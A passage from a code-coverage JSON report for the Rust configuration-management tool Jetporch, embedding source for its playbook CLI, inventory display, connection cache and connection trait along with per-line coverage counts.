ngth":0,"stats":{"Line":0}},{"line":594,"address":[],"length":0,"stats":{"Line":0}},{"line":596,"address":[],"length":0,"stats":{"Line":0}},{"line":599,"address":[],"length":0,"stats":{"Line":0}},{"line":600,"address":[],"length":0,"stats":{"Line":0}},{"line":601,"address":[],"length":0,"stats":{"Line":0}},{"line":602,"address":[],"length":0,"stats":{"Line":0}},{"line":604,"address":[],"length":0,"stats":{"Line":0}},{"line":607,"address":[],"length":0,"stats":{"Line":0}},{"line":608,"address":[],"length":0,"stats":{"Line":0}},{"line":609,"address":[],"length":0,"stats":{"Line":0}},{"line":610,"address":[],"length":0,"stats":{"Line":0}},{"line":612,"address":[],"length":0,"stats":{"Line":0}},{"line":615,"address":[],"length":0,"stats":{"Line":0}},{"line":616,"address":[],"length":0,"stats":{"Line":0}},{"line":617,"address":[],"length":0,"stats":{"Line":0}},{"line":618,"address":[],"length":0,"stats":{"Line":0}},{"line":620,"address":[],"length":0,"stats":{"Line":0}},{"line":623,"address":[],"length":0,"stats":{"Line":0}},{"line":624,"address":[],"length":0,"stats":{"Line":0}},{"line":625,"address":[],"length":0,"stats":{"Line":0}},{"line":626,"address":[],"length":0,"stats":{"Line":0}},{"line":628,"address":[],"length":0,"stats":{"Line":0}},{"line":631,"address":[],"length":0,"stats":{"Line":0}},{"line":632,"address":[],"length":0,"stats":{"Line":0}},{"line":633,"address":[],"length":0,"stats":{"Line":0}},{"line":634,"address":[],"length":0,"stats":{"Line":0}},{"line":636,"address":[],"length":0,"stats":{"Line":0}},{"line":639,"address":[],"length":0,"stats":{"Line":0}},{"line":640,"address":[],"length":0,"stats":{"Line":0}},{"line":641,"address":[],"length":0,"stats":{"Line":0}},{"line":644,"address":[],"length":0,"stats":{"Line":0}},{"line":645,"address":[],"length":0,"stats":{"Line":0}},{"line":646,"address":[],"length":0,"stats":{"Line":0}},{"line":649,"address":[],"length":0,"stats":{"Line":0}},{"line":650,"address":[],"length":0,"stats":{"Line":0}},{"line":651,"address":[],"length":0,"stats":{"Line":0}},{"line":653,"address":[],"length":0,"stats":{"Line":0}},{"line":654,"address":[],"length":0,"stats":{"Line":0}},{"line":655,"address":[],"length":0,"stats":{"Line":0}},{"line":659,"address":[],"length":0,"stats":{"Line":0}},{"line":660,"address":[],"length":0,"stats":{"Line":0}},{"line":661,"address":[],"length":0,"stats":{"Line":0}},{"line":662,"address":[],"length":0,"stats":{"Line":0}},{"line":666,"address":[],"length":0,"stats":{"Line":0}},{"line":667,"address":[],"length":0,"stats":{"Line":0}},{"line":668,"address":[],"length":0,"stats":{"Line":0}},{"line":669,"address":[],"length":0,"stats":{"Line":0}},{"line":673,"address":[],"length":0,"stats":{"Line":0}},{"line":674,"address":[],"length":0,"stats":{"Line":0}},{"line":675,"address":[],"length":0,"stats":{"Line":0}},{"line":678,"address":[],"length":0,"stats":{"Line":0}},{"line":679,"address":[],"length":0,"stats":{"Line":0}},{"line":680,"address":[],"length":0,"stats":{"Line":0}},{"line":683,"address":[],"length":0,"stats":{"Line":0}},{"line":684,"address":[],"length":0,"stats":{"Line":0}},{"line":685,"address":[],"length":0,"stats":{"Line":0}},{"line":686,"address":[],"length":0,"stats":{"Line":0}},{"line":687,"address":[],"length":0,"stats":{"Line":0}},{"line":688,"address":[],"length":0,"stats":{"Line":0}},{"line":689,"address":[],"length":0,"stats":{"Line":0}},{"line":690,"address":[],"length":0,"stats":{"Line":0}},{"line":691,"address":[],"length":0,"stats":{"Line":0}},{"line":692,"address":[],"length":0,"stats":{"Line":0}},{"line":697,"address":[],"length":0,"stats":{"Line":0}},{"line":700,"address":[],"length":0,"stats":{"Line":0}},{"line":701,"address":[],"length":0,"stats":{"Line":0}},{"line":702,"address":[],"length":0,"stats":{"Line":0}},{"line":703,"address":[],"length":0,"stats":{"Line":0}},{"line":704,"address":[],"length":0,"stats":{"Line":0}},{"line":705,"address":[],"length":0,"stats":{"Line":0}},{"line":706,"address":[],"length":0,"stats":{"Line":0}},{"line":707,"address":[],"length":0,"stats":{"Line":0}},{"line":708,"address":[],"length":0,"stats":{"Line":0}},{"line":709,"address":[],"length":0,"stats":{"Line":0}},{"line":714,"address":[],"length":0,"stats":{"Line":0}},{"line":717,"address":[],"length":0,"stats":{"Line":0}},{"line":719,"address":[],"length":0,"stats":{"Line":0}},{"line":720,"address":[],"length":0,"stats":{"Line":0}},{"line":721,"address":[],"length":0,"stats":{"Line":0}},{"line":722,"address":[],"length":0,"stats":{"Line":0}},{"line":723,"address":[],"length":0,"stats":{"Line":0}},{"line":724,"address":[],"length":0,"stats":{"Line":0}},{"line":725,"address":[],"length":0,"stats":{"Line":0}},{"line":726,"address":[],"length":0,"stats":{"Line":0}},{"line":730,"address":[],"length":0,"stats":{"Line":0}},{"line":733,"address":[],"length":0,"stats":{"Line":0}},{"line":736,"address":[],"length":0,"stats":{"Line":0}},{"line":738,"address":[],"length":0,"stats":{"Line":0}},{"line":739,"address":[],"length":0,"stats":{"Line":0}},{"line":740,"address":[],"length":0,"stats":{"Line":0}},{"line":741,"address":[],"length":0,"stats":{"Line":0}},{"line":742,"address":[],"length":0,"stats":{"Line":0}},{"line":743,"address":[],"length":0,"stats":{"Line":0}},{"line":744,"address":[],"length":0,"stats":{"Line":0}},{"line":745,"address":[],"length":0,"stats":{"Line":0}},{"line":749,"address":[],"length":0,"stats":{"Line":0}},{"line":752,"address":[],"length":0,"stats":{"Line":0}},{"line":755,"address":[],"length":0,"stats":{"Line":0}},{"line":757,"address":[],"length":0,"stats":{"Line":0}},{"line":760,"address":[],"length":0,"stats":{"Line":0}},{"line":761,"address":[],"length":0,"stats":{"Line":0}},{"line":762,"address":[],"length":0,"stats":{"Line":0}},{"line":763,"address":[],"length":0,"stats":{"Line":0}},{"line":765,"address":[],"length":0,"stats":{"Line":0}},{"line":766,"address":[],"length":0,"stats":{"Line":0}},{"line":767,"address":[],"length":0,"stats":{"Line":0}},{"line":768,"address":[],"length":0,"stats":{"Line":0}},{"line":769,"address":[],"length":0,"stats":{"Line":0}},{"line":771,"address":[],"length":0,"stats":{"Line":0}},{"line":776,"address":[],"length":0,"stats":{"Line":0}},{"line":777,"address":[],"length":0,"stats":{"Line":0}},{"line":778,"address":[],"length":0,"stats":{"Line":0}},{"line":779,"address":[],"length":0,"stats":{"Line":0}},{"line":781,"address":[],"length":0,"stats":{"Line":0}},{"line":782,"address":[],"length":0,"stats":{"Line":0}},{"line":786,"address":[],"length":0,"stats":{"Line":0}},{"line":790,"address":[],"length":0,"stats":{"Line":0}},{"line":791,"address":[],"length":0,"stats":{"Line":0}},{"line":792,"address":[],"length":0,"stats":{"Line":0}},{"line":795,"address":[],"length":0,"stats":{"Line":0}},{"line":796,"address":[],"length":0,"stats":{"Line":0}},{"line":797,"address":[],"length":0,"stats":{"Line":0}},{"line":798,"address":[],"length":0,"stats":{"Line":0}},{"line":799,"address":[],"length":0,"stats":{"Line":0}},{"line":800,"address":[],"length":0,"stats":{"Line":0}},{"line":802,"address":[],"length":0,"stats":{"Line":0}},{"line":1049,"address":[],"length":0,"stats":{"Line":4}},{"line":1050,"address":[],"length":0,"stats":{"Line":16}},{"line":1054,"address":[],"length":0,"stats":{"Line":0}},{"line":1055,"address":[],"length":0,"stats":{"Line":0}},{"line":1056,"address":[],"length":0,"stats":{"Line":0}},{"line":1057,"address":[],"length":0,"stats":{"Line":0}},{"line":1058,"address":[],"length":0,"stats":{"Line":0}},{"line":1059,"address":[],"length":0,"stats":{"Line":0}},{"line":1060,"address":[],"length":0,"stats":{"Line":0}},{"line":1061,"address":[],"length":0,"stats":{"Line":0}},{"line":1063,"address":[],"length":0,"stats":{"Line":0}},{"line":1066,"address":[],"length":0,"stats":{"Line":0}}],"covered":152,"coverable":433},{"path":["/","Users","wings","projects","jetpack","src","cli","playbooks.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::cli::parser::CliParser;\n\nuse crate::connection::ssh::SshFactory;\nuse crate::connection::local::LocalFactory;\nuse crate::connection::no::NoFactory;\nuse crate::playbooks::traversal::{playbook_traversal,RunState};\nuse crate::playbooks::context::PlaybookContext;\nuse crate::playbooks::visitor::{PlaybookVisitor,CheckMode};\nuse crate::inventory::inventory::Inventory;\nuse std::sync::{Arc,RwLock};\n\n// code behind *most* playbook related CLI commands, launched from main.rs\n\nenum ConnectionMode {\n    Ssh,\n    Local,\n    Simulate\n}\n\npub fn playbook_ssh(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, parser: \u0026CliParser) -\u003e i32 {\n    return playbook(inventory, parser, CheckMode::No, ConnectionMode::Ssh);\n}\n\npub fn playbook_check_ssh(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, parser: \u0026CliParser) -\u003e i32 {\n    return playbook(inventory, parser, CheckMode::Yes, ConnectionMode::Ssh);\n}\n\npub fn playbook_local(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, parser: \u0026CliParser) -\u003e i32 {\n    return playbook(inventory, parser, CheckMode::No, ConnectionMode::Local);\n}\n\npub fn playbook_check_local(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, parser: \u0026CliParser) -\u003e i32 {\n    return playbook(inventory, parser, CheckMode::Yes, ConnectionMode::Local);\n}\n\npub fn playbook_simulate(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, parser: \u0026CliParser) -\u003e i32 {\n    return playbook(inventory, parser, CheckMode::No, ConnectionMode::Simulate);\n}\n\nfn playbook(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, parser: \u0026CliParser, check_mode: CheckMode, connection_mode: ConnectionMode) -\u003e i32 {\n    let run_state = Arc::new(RunState {\n        // every object gets an inventory, though with local modes it's empty.\n        inventory: Arc::clone(inventory),\n        playbook_paths: Arc::clone(\u0026parser.playbook_paths),\n        role_paths: Arc::clone(\u0026parser.role_paths),\n        module_paths: Arc::clone(\u0026parser.module_paths),\n        limit_hosts: parser.limit_hosts.clone(),\n        limit_groups: parser.limit_groups.clone(),\n        batch_size: parser.batch_size.clone(),\n        // the context is constructed with an instance of the parser instead of having a back-reference\n        // to run-state.  Context should mostly *not* get parameters from the parser unless they\n        // are going to appear in variables.\n        context: Arc::new(RwLock::new(PlaybookContext::new(parser))),\n        visitor: Arc::new(RwLock::new(PlaybookVisitor::new(check_mode))),\n        connection_factory: match connection_mode {\n            ConnectionMode::Ssh =\u003e Arc::new(RwLock::new(SshFactory::new(inventory, parser.forward_agent, parser.login_password.clone()))),\n            ConnectionMode::Local =\u003e Arc::new(RwLock::new(LocalFactory::new(inventory))),\n            ConnectionMode::Simulate =\u003e Arc::new(RwLock::new(NoFactory::new()))\n        },\n        tags: parser.tags.clone(),\n        allow_localhost_delegation: parser.allow_localhost_delegation\n    });\n    return match playbook_traversal(\u0026run_state) {\n        Ok(_)  =\u003e run_state.visitor.read().unwrap().get_exit_status(\u0026run_state.context),\n        Err(s) =\u003e { println!(\"{}\", s); 1 }\n    };\n}\n\n","traces":[{"line":36,"address":[],"length":0,"stats":{"Line":0}},{"line":37,"address":[],"length":0,"stats":{"Line":0}},{"line":40,"address":[],"length":0,"stats":{"Line":0}},{"line":41,"address":[],"length":0,"stats":{"Line":0}},{"line":44,"address":[],"length":0,"stats":{"Line":0}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":49,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":65,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":30},{"path":["/","Users","wings","projects","jetpack","src","cli","show.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::util::terminal::{two_column_table, captioned_display};\nuse std::sync::Arc;\nuse std::sync::RwLock;\nuse crate::inventory::inventory::Inventory;\n\n// cli support for the show-inventory subcommand\n\nfn string_slice(values: \u0026Vec\u003cString\u003e) -\u003e String {\n    // if there are too many values the output of various group/host lists in the tables\n    // stops being useful. we may want to have some flag where we don't show the\n    // nice tables for this, though right now they really don't exist\n    if values.len() \u003e 500 {\n        let tmp = values[0..499].to_vec();\n        return format!(\"{}, ...\", tmp.join(\", \"));\n    }\n    return values.join(\", \");\n}\n\n// ==============================================================================================================\n// PUBLIC API\n// ==============================================================================================================\n\n// jetp show --inventory \u003cpath\u003e --hosts host1:host2\n\npub fn show_inventory_host(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, host_name: \u0026String) -\u003e Result\u003c(),String\u003e {\n\n    let inventory = inventory.read().expect(\"inventory read\");\n\n    if !inventory.has_host(\u0026host_name.clone()) {\n        return Err(format!(\"no such host: {}\", host_name.clone()));\n    }\n    let binding = inventory.get_host(\u0026host_name.clone());\n    let host = binding.read().unwrap();\n    \n    println!(\"Host: {}\", host_name);\n    println!(\" \");\n\n    let mut parents               : Vec\u003cString\u003e = host.get_group_names();\n    let mut ancestors             : Vec\u003cString\u003e = host.get_ancestor_group_names();\n    let blended_variables     = host.get_blended_variables_yaml()?;\n    \n    parents.sort();\n    ancestors.sort();\n\n    let ancestor_string = string_slice(\u0026ancestors);\n    let parents_string  = string_slice(\u0026parents);\n  \n    let host_elements : Vec\u003c(String,String)\u003e = vec![\n        (String::from(\"Ancestor Groups\"), ancestor_string),\n        (String::from(\"Direct Groups\"), parents_string),\n\n    ];\n\n    two_column_table(\u0026String::from(\"Host Report:\"), \u0026String::from(\"\"), \u0026host_elements);\n    println!(\"\");\n\n    captioned_display(\u0026String::from(\"Variables\"), \u0026blended_variables);\n    println!(\"\");\n\n    return Ok(());\n}\n\n// jetp show --inventory \u003cpath\u003e # implicit --group all\n// jetp show --inventory \u003cpath\u003e --groups group1:group2\n\npub fn show_inventory_group(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, group_name: \u0026String) -\u003e Result\u003c(),String\u003e {\n\n    let inventory = inventory.read().expect(\"inventory read\");\n\n    if !inventory.has_group(\u0026group_name.clone()) {\n        return Err(format!(\"no such group: {}\", group_name));\n    }\n    let binding = inventory.get_group(\u0026group_name.clone());\n    let group = binding.read().unwrap();\n    \n    println!(\"Group: {}\", group_name);\n    println!(\"\");\n\n    let mut descendants          : Vec\u003cString\u003e  = group.get_descendant_group_names();\n    let mut children             : Vec\u003cString\u003e  = group.get_subgroup_names();\n    let mut ancestors            : Vec\u003cString\u003e  = group.get_ancestor_group_names();\n    let mut parents              : Vec\u003cString\u003e  = group.get_parent_group_names();\n    let mut descendant_hosts     : Vec\u003cString\u003e  = group.get_descendant_host_names();\n    let mut child_hosts          : Vec\u003cString\u003e  = group.get_direct_host_names();\n\n    descendants.sort();\n    children.sort();\n    ancestors.sort();\n    parents.sort();\n    descendant_hosts.sort();\n    child_hosts.sort();\n\n    let blended_variables      = group.get_blended_variables_yaml()?;\n    let descendant_hosts_count = String::from(format!(\"{}\", descendant_hosts.len()));\n    let child_hosts_count      = String::from(format!(\"{}\", child_hosts.len()));\n    \n    // TODO: add a method that \"...\"'s these strings if too long - just use for hosts\n\n    let descendants_string = string_slice(\u0026descendants);\n    let children_string = string_slice(\u0026children);\n    let ancestors_string = string_slice(\u0026ancestors);\n    let parents_string = string_slice(\u0026parents);\n    let descendant_hosts_string = string_slice(\u0026descendant_hosts);\n    let child_hosts_string = string_slice(\u0026child_hosts);\n\n    let group_elements : Vec\u003c(String,String)\u003e = vec![\n        (String::from(\"All Descendants\"), descendants_string),\n        (String::from(\"Children\"), children_string),\n        (String::from(\"All Ancestors\"), ancestors_string),\n        (String::from(\"Parents\"), parents_string)\n    ];\n\n    let host_elements : Vec\u003c(String, String)\u003e = vec![\n        (format!(\"All Ancestors ({})\",descendant_hosts_count), descendant_hosts_string),\n        (format!(\"Children ({})\", child_hosts_count), child_hosts_string),\n    ];\n\n    two_column_table(\u0026String::from(\"Group Report:\"), \u0026String::from(\"\"), \u0026group_elements);\n    println!(\"\");\n\n    \n    two_column_table(\u0026String::from(\"Host Report:\"), \u0026String::from(\"\"), \u0026host_elements);\n    println!(\"\");\n    captioned_display(\u0026String::from(\"Variables\"), \u0026blended_variables);\n    println!(\"\");\n\n    return Ok(());\n}\n\n\n\n","traces":[{"line":24,"address":[],"length":0,"stats":{"Line":0}},{"line":28,"address":[],"length":0,"stats":{"Line":0}},{"line":29,"address":[],"length":0,"stats":{"Line":0}},{"line":30,"address":[],"length":0,"stats":{"Line":0}},{"line":32,"address":[],"length":0,"stats":{"Line":0}},{"line":41,"address":[],"length":0,"stats":{"Line":0}},{"line":43,"address":[],"length":0,"stats":{"Line":0}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":49,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":58,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":65,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":131,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":72},{"path":["/","Users","wings","projects","jetpack","src","cli","version.rs"],"content":"// auto generated by version.sh script\npub const GIT_VERSION: \u0026str  = \"40c6e2e78c111dbca2fb303e958ab1e7e730c284\";\npub const GIT_BRANCH: \u0026str  = \"main\";\npub const BUILD_TIME: \u0026str  = \"Wed  9 Jul 2025 11:14:49 BST\";\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","connection","cache.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::connection::connection::{Connection};\nuse crate::inventory::hosts::Host;\nuse std::sync::Arc;\nuse std::sync::Mutex;\nuse std::sync::RwLock;\nuse std::collections::HashMap;\n\npub struct ConnectionCache {\n    connections: HashMap\u003cString, Arc\u003cMutex\u003cdyn Connection\u003e\u003e\u003e\n}\n\nimpl ConnectionCache {\n    pub fn new() -\u003e Self {\n        Self {\n            connections: HashMap::new()\n        }\n    }\n\n    pub fn add_connection(\u0026mut self, host:\u0026Arc\u003cRwLock\u003cHost\u003e\u003e, connection: \u0026Arc\u003cMutex\u003cdyn Connection\u003e\u003e) {\n        let host2 = host.read().expect(\"host read\");\n        self.connections.insert(host2.name.clone(), Arc::clone(connection));\n    }\n\n    pub fn has_connection(\u0026self, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) -\u003e bool {\n        let host2 = host.read().expect(\"host read\");\n        return self.connections.contains_key(\u0026host2.name.clone());\n    }\n\n    pub fn get_connection(\u0026self, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) -\u003e Arc\u003cMutex\u003cdyn Connection\u003e\u003e {\n        let host2 = host.read().expect(\"host read\");\n        return Arc::clone(self.connections.get(\u0026host2.name.clone()).unwrap());\n    }\n\n    pub fn clear(\u0026mut self) {\n        self.connections.clear();\n    }\n}","traces":[{"line":29,"address":[],"length":0,"stats":{"Line":0}},{"line":31,"address":[],"length":0,"stats":{"Line":0}},{"line":35,"address":[],"length":0,"stats":{"Line":0}},{"line":36,"address":[],"length":0,"stats":{"Line":0}},{"line":37,"address":[],"length":0,"stats":{"Line":0}},{"line":40,"address":[],"length":0,"stats":{"Line":0}},{"line":41,"address":[],"length":0,"stats":{"Line":0}},{"line":42,"address":[],"length":0,"stats":{"Line":0}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":13},{"path":["/","Users","wings","projects","jetpack","src","connection","command.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::sync::Arc;\nuse crate::tasks::response::TaskResponse;\n\n// details useful for working with commands\n// not much here, see handle/remote.rs for more\n\n#[derive(Clone,Debug)]\npub struct CommandResult {\n    pub cmd: String,\n    pub out: String,\n    pub rc: i32\n}\n\n#[derive(Debug,Copy,Clone,PartialEq)]\npub enum Forward {\n    Yes,\n    No\n}\n\npub fn cmd_info(info: \u0026Arc\u003cTaskResponse\u003e) -\u003e (i32, String) {\n    assert!(info.command_result.is_some(), \"called cmd_info on a response that is not a command result\");\n    let result = info.command_result.as_ref().as_ref().unwrap();\n    return (result.rc, result.out.clone());\n}\n\n","traces":[{"line":36,"address":[],"length":0,"stats":{"Line":3}},{"line":37,"address":[],"length":0,"stats":{"Line":4}},{"line":38,"address":[],"length":0,"stats":{"Line":2}},{"line":39,"address":[],"length":0,"stats":{"Line":2}}],"covered":4,"coverable":4},{"path":["/","Users","wings","projects","jetpack","src","connection","connection.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::request::TaskRequest;\nuse crate::tasks::response::TaskResponse;\nuse crate::handle::response::Response;\nuse std::sync::Arc;\nuse std::marker::{Send,Sync};\nuse std::path::Path;\nuse crate::connection::command::Forward;\n\n// the connection trait that serves as the base for SshConnection, LocalConnection, and NoConnection\n\npub trait Connection : Send + Sync {\n\n    fn connect(\u0026mut self) -\u003e Result\u003c(),String\u003e;  \n\n    // FIXME: add error return objects\n    \n    fn write_data(\u0026self, response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, data: \u0026String, remote_path: \u0026String) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e;\n\n    fn copy_file(\u0026self, response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, src: \u0026Path, dest: \u0026String) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e;\n\n    fn whoami(\u0026self) -\u003e Result\u003cString,String\u003e;\n\n    fn run_command(\u0026self, response: \u0026Arc\u003cResponse\u003e, request: \u0026Arc\u003cTaskRequest\u003e, cmd: \u0026String, forward: Forward) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e;\n\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","connection","factory.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse 